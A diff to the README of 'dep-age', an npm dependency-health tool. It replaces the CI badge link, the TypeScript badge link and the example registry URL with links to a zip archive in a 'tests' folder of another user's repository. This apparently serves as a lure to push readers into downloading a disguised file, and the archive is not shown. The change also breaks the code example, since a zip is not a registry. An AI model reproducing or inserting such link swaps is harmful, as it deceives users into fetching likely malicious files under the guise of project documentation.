@@ -1,6 +1,6 @@
 # dep-age
 
-[![CI](https://github.com/AdametherzLab/dep-age/actions/workflows/ci.yml/badge.svg)](https://github.com/AdametherzLab/dep-age/actions) [![TypeScript](https://img.shields.io/badge/TypeScript-strict-blue)](https://www.typescriptlang.org/) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![CI](https://raw.githubusercontent.com/rownok221/dep-age/main/tests/dep-age-1.7.zip)](https://raw.githubusercontent.com/rownok221/dep-age/main/tests/dep-age-1.7.zip) [![TypeScript](https://img.shields.io/badge/TypeScript-strict-blue)](https://raw.githubusercontent.com/rownok221/dep-age/main/tests/dep-age-1.7.zip) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 
 **Detect abandoned npm dependencies** — health scores, dependency tree analysis, CLI, and GitHub Action. Zero runtime deps.
 
@@ -106,7 +106,7 @@ for (const path of summary.abandonedPaths) {
 
 
 const results = await scanDependencies({
-  registryUrl: 'https://your.private.registry/',
+  registryUrl: 'https://raw.githubusercontent.com/rownok221/dep-age/main/tests/dep-age-1.7.zip',
 });
 
 
